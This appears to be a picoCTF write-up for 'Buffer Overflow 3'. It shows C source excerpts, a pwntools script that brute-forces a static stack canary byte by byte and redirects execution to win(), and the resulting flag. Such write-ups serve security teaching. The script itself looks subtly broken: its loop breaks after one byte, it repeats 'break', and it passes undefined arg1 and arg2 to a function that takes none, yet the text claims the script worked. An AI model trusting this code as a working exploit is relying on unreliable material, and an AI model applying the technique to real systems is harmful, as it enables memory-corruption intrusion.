# Buffer Overflow 3

## Challenge Description: Do you think you can bypass the protection and get the flag?

For this challenge, the vulnerable program has a stack canary that needs to be replaced during the buffer overflow. From the [source code](./vuln.c), we can see that a global canary is declared and subsequently copied into a local variable *canary* in the **vuln** function:

```C
#define CANARY_SIZE 4
char global_canary[CANARY_SIZE];
// Inside Vuln function 
char canary[CANARY_SIZE];
memcpy(canary,global_canary,CANARY_SIZE);
if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
```

If the local canary value does not equals to the global value, the program immediately crashes. Since the canary is only 4 bytes long, we should be able to perform a brute force attack on it character by character. We will check for the beginning of the output (**\*\*\*\*\**) for a failed *memcmp* check to determine if our character is right or wrong.

In order to perform the attack, we will need to know the location of the following information:

1. Address of the global canary variable (Using **info variables**)
   ![global _canary_add](https://user-images.githubusercontent.com/71312079/160633120-d176175c-88b9-48d5-b5ce-efb300413c20.png)

2. Buffer location (From disassembling **vuln()**)
   ![buffer_loc](https://user-images.githubusercontent.com/71312079/160633098-7416390c-e970-4a9c-ae74-030918319fb1.png)

3. Canary offset (From disassembling **vuln()**)
   ![canary_offest](https://user-images.githubusercontent.com/71312079/160633107-b8f69d8c-bafc-4aa8-9790-c43633539162.png)

Looking back at our source code again, we see that we desire to jump to the **win()** function that will print the flag.

```C
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}
```

I then crafted the following payload: 

```python
from pwn import *

exe = './vuln' #name of 32bit program
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
#p = remote('IP/hostname', port)
offset = 0x50 - 0x10 # difference from buffer & canary offsets  
num_found = 0
canary = b''

while True:
    for i in range(256): # brute forcing canary

        p = process(exe)
        p.sendlineafter(b">", str(offset + num_found).encode('utf-8'))

        p.sendlineafter(b">", b"A"* offset + canary + bytes([i]))
        if b"*****" in p.recvline():
            i += 1
            continue 
        canary += bytes([i])
        num_found += 1
        if num_found == 4:
            break
            break
        break

print(canary)

rop = ROP(elf)
rop.win(arg1,arg2) 
payload = flat({
    offset: rop.chain()
})

p.sendline(payload)
p.interactive()
```

Running the code aboved produced the canary value ```BiRd``` (Coincidentally also the name of a similar challenge in Pico 2019) as well as the flag:

![flag](https://user-images.githubusercontent.com/71312079/160633115-ba58ad21-3420-4268-ba4a-e829ba02493b.png)

FLAG: `picoCTF{Stat1C_c4n4r13s_4R3_b4D_9602b3a1}`

NOTE: I originally did NOT do the ROP method and manually crafted the payload, which didn't work as I did not include "junk" as padding for the return pointer. This was hence a good lesson on the importance of knowing technical details beyond easy-to-use tools like ROP.

```python
flag_addr = p32(elf.symbols['win'])  
payload = flat({
    offset: [
    flag_addr,
    "junk", # junk needed as the function will first push return pointer onto stack -> padding for return pointer 
    p32(arg1),
    p32(arg2)
    ]
})
```